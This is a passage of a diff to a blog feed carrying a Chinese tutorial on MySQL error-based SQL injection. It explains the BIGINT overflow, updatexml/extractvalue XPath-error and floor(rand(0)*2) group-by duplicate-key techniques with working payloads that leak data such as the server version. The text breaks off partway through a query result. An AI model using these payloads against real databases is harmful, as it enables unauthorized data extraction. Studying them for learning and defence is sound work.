+<p>而在mysql&gt;5.5.53时，则不能返回查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(`a`.`x`)) - ~(0))&apos;</span><br></pre></td></tr></table></figure>
+<p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. */</span><br><span class="line"></span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-xpath语法错误"><a href="#0x02-xpath语法错误" class="headerlink" title="0x02 xpath语法错误"></a>0x02 xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html" target="_blank" rel="noopener">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,&apos;/a/b&apos;);</span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&apos;/a/b&apos;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+<p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-主键重复"><a href="#0x03-主键重复" class="headerlink" title="0x03 主键重复"></a>0x03 主键重复</h2><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from test group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p>
+<ul>
+<li>先是建立虚拟表，其中key为主键，不可重复：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jack</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+<tr>
+<td>candy</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<p>当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>同理，floor(rand(0)*2)则会固定得到011011…的序列(这个很重要)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+-----------</span><br></pre></td></tr></table></figure>]]></content>
+      
+        
+        <tags>
+            
+            <tag> mysql </tag>
+            
+            <tag> sql </tag>
+            
+            <tag> injection </tag>
             
         </tags>
         
